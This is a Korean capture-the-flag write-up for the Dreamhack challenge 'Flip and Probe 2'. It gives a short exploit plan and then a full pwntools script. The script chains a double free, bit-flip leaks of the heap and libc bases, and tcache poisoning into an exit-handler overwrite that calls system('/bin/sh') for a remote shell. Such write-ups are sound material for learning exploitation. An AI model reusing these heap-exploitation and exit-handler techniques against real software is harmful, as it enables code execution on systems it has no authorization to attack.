익스 계획 짜기 :
Flip and Probe에서 사용했던 double free 취약점이 그대로 존재한다. 하지만 이제는 gimmeflag 따윈 없기 때문에 다른 방법을 찾아야 한다.
```bash
[*] '/mnt/d/hk/dreamhack/pwn/lv8/Flip and Probe 2/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```
보호기법이 다 걸려있다.

마지막에 exit(0)이 보인다. exit이 있으면 exit handler overwrite가 가능하다. 
1. fs_base+0x30의 위치에 p64(0) 덮기 (덮을 수 없다면 값을 leak해도 됨)
2. initial+0x10에 p64(4), initial+0x18에 호출하고 싶은 함수를 0x11만큼 rol한 값 , initial+0x20에 인자 주소 덮기
3. exit함수 실행
[출처](https://velog.io/@chk_pass/Exit-handler-overwrite)

이러면 libc_base를 따야 한다. 근데 malloc 크기가 0x30으로 고정되어 있어서 unsorted bin으로 libc base를 쉽게 딸 수 없다. 그리고 어떤 청크에서 0x30바이트만큼만 접근할 수 있으므로 다른 청크의 사이즈를 변조하지 못한다. 
double free로 같은 주소를 가지는 인덱스를 많이 생성하고, 비트플립을 통해 heap_base를 알아낸다. 청크 하나를 더 만들고 tcache positioning으로 주소를 조작해 chunk overlapping해서 chunk size를 크게 변경하고 free시켜 unsorted bin에 들어가게 한다. 그럼 libc 관련 주소가 있을텐데 그것도 노가다로 읽어온다. 이렇게 libc_base를 딴다.
그리고 tcache positioning으로 exit handler overwrite해서 쉘을 딴다.

exit handler overwrite를 할 때 주의할 점이 있다. initial에는 0, initial+0x8에는 0이 아닌 값이 들어있어야 한다.
tcache positioning을 할 때 size를 직접 써야 거기서 double free를 유발하고 값을 쓸 수 있다. 따라서 쓰고 싶은 곳 - 0x10에 주소를 할당받고 비트플립 1번으로 0x40 사이즈의 fake chunk를 만들어야 한다.

```python
from pwn import *
from tqdm import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('host3.dreamhack.games', 13395)
#p = process('./main')
l = ELF('./libc.so.6')

def ma(i1: int):
    p.sendafter(b'> ', b'0')
    p.sendafter(b'> ', str(i1).encode())

def fr(i1: int):
    p.sendafter(b'> ', b'2')
    p.sendafter(b'> ', str(i1).encode())

def fl(i1: int, i2: int):
    p.sendafter(b'> ', b'1')
    p.sendafter(b'> ', str(i1).encode())
    p.sendafter(b'> ', str(i2).encode())
    return p.recvn(1)

def unlink_heap(num: int):
    res = 0
    last = 0
    n = list()
    while num > 0:
        n.append(num & ((1 << 12) - 1))
        num >>= 12

    for i in range(len(n) - 1, -1, -1):
        n[i] ^= last
        res <<= 12
        res += n[i]
        last = n[i]
    
    return res

def double_free(i1: int, i2: int):
    fr(i1)
    fl(i1, 64)
    fr(i1)
    ma(i2)
    ma(i1)

ma(0)
ma(128)
ma(255)
for i in trange(1, 64 + 1):
    ma(i)
for i in trange(1, 64 + 1):
    double_free(0, i)
for i in trange(128 + 1, 128 + 48 * 2 + 1):
    double_free(128, i)
    
heap_base = 0
for i in trange(1, 64 + 1):
    heap_base += int(fl(i, i - 1).decode(), 10) << (i - 1)
heap_base = unlink_heap(heap_base)
print(f"heap_base = {hex(heap_base)}")

for i in trange(1, 64 + 1):
    double_free(0, i)
addr = (heap_base + 0x20) ^ (heap_base >> 12)
cmp = (heap_base + 0x80) ^ (heap_base >> 12)
fr(255)
fr(0)
for i in trange(1, 64 + 1):
    if addr & (1 << (i - 1)) != cmp & (1 << (i - 1)):
        fl(i, i - 1)

ma(0)
ma(254)
fl(254, 8 * 25 + 4)
fr(128)
l.address = 0
for i in trange(128 + 1, 128 + 48 + 1):
    l.address += int(fl(i, i - 128 - 1).decode(), 10) << (i - 128 - 1)
for i in trange(128 + 48 + 1, 128 + 48 * 2 + 1):
    fl(i, i - 128 - 48 - 1)
l.address -= 0x7fb8b12bace0 - 0x7fb8b10a1000
print(f"libc_base = {hex(l.address)}")
fs_base = l.address + (0x7ffff7d90740 - 0x7ffff7d93000)
initial = l.address + (0x7ffff7fadf00 - 0x7ffff7d93000)
system = l.sym['system']
binsh = list(l.search(b'/bin/sh'))[0]

# fs_base + 0x30
for i in trange(1, 128 + 1):
    double_free(0, i)
ma(255)
fr(255)
fr(0)
bit = 0
for i in trange(1, 128 + 1):
    flip_bit = int(fl(i, bit).decode(), 10)
    if (flip_bit << bit) != (((fs_base + 0x20) ^ (heap_base >> 12)) & (1 << bit)):
        bit += 1
    if bit == 64:
        break
ma(0)
ma(130)
fl(130, 70)

for i in trange(1, 128 + 1):
    double_free(0, i)
ma(255)
fr(255)
fr(0)
bit = 0
for i in trange(1, 128 + 1):
    flip_bit = int(fl(i, bit).decode(), 10)
    if (flip_bit << bit) != (((fs_base + 0x30) ^ (heap_base >> 12)) & (1 << bit)):
        bit += 1
    if bit == 64:
        break
ma(0)
ma(130)
for i in trange(1, 128 + 1):
    double_free(130, i)
bit = 0
for i in trange(1, 128 + 1):
    flip_bit = int(fl(i, bit).decode(), 10)
    if flip_bit != 0:
        bit += 1
    if bit == 64:
        break

# initial
for i in trange(1, 128 + 1):
    double_free(0, i)
ma(255)
fr(255)
fr(0)
bit = 0
for i in trange(1, 128 + 1):
    flip_bit = int(fl(i, bit).decode(), 10)
    if (flip_bit << bit) != (((initial - 0x10) ^ (heap_base >> 12)) & (1 << bit)):
        bit += 1
    if bit == 64:
        break
ma(0)
ma(130)
fl(130, 70)

for i in trange(1, 128 + 1):
    double_free(0, i)
ma(255)
fr(255)
fr(0)
bit = 0
for i in trange(1, 128 + 1):
    flip_bit = int(fl(i, bit).decode(), 10)
    if (flip_bit << bit) != ((initial ^ (heap_base >> 12)) & (1 << bit)):
        bit += 1
    if bit == 64:
        break
ma(0)
ma(130)
for i in trange(1, 128 + 1):
    double_free(130, i)
bit = 0
for i in trange(1, 128 + 1):
    flip_bit = int(fl(i, bit + 128).decode(), 10)
    if (flip_bit << bit) != (4 & (1 << bit)):
        bit += 1
    if bit == 64:
        break

for i in trange(1, 128 + 1):
    double_free(130, i)
bit = 0
for i in trange(1, 128 + 1):
    flip_bit = int(fl(i, bit + 192).decode(), 10)
    if (flip_bit << bit) != (((system << 17) ^ (system >> 47)) & (1 << bit)):
        bit += 1
    if bit == 64:
        break

for i in trange(1, 128 + 1):
    double_free(130, i)
bit = 0
for i in trange(1, 128 + 1):
    flip_bit = int(fl(i, bit + 256).decode(), 10)
    if (flip_bit << bit) != (binsh & (1 << bit)):
        bit += 1
    if bit == 64:
        break

for i in trange(1, 128 + 1):
    double_free(130, i)
bit = 0
for i in trange(1, 128 + 1):
    flip_bit = int(fl(i, bit).decode(), 10)
    if flip_bit != 0:
        bit += 1
    if bit == 64:
        break
fl(128, 64)

p.sendafter(b'> ', b'3')
p.interactive()
```